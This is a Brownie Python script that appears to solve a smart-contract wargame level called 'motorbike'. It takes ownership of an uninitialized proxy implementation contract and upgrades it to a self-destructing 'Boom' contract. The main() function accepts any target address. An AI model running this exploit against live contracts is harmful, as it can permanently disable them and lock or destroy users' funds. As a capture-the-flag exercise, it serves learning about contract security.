from brownie import accounts, config, run, Boom, interface, web3

def attack(target, hacker):
    engine_addr = web3.eth.get_storage_at(target, 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc)
    # ethereum address is 20 bytes long
    engine_addr = engine_addr[-20:]
    engine = interface.IEngine(engine_addr)
    # become owner
    engine.initialize({'from': hacker})
    boom = Boom.deploy({'from': hacker})
    print("Contract deployed")
    tx = engine.upgradeToAndCall(boom.address, boom.explode.encode_input(), {'from': hacker})
    print("Upgrade done")


def fake():
    hacker = accounts[2]
    ret = run('bootstrap')
    target = ret['motorbike'].address
    attack(target, hacker)


def main(target):
    hacker = accounts.add(config['wallets']['from_key'])
    print(f'Target: {target}')
    attack(target, hacker)
    print("DONE!")
